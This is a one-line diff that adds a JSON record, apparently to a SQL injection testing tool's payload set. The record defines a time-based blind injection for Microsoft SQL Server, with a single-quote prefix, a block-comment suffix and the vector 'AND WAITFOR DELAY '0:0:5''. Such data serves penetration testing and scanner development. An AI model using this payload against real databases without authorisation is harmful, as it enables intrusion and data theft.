@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "time", "boundary": {"prefix": "'", "suffix": "/*", "type": "single"}, "vector": "{B} AND WAITFOR DELAY '0:0:5'", "comment": "mssql time: single, block"}
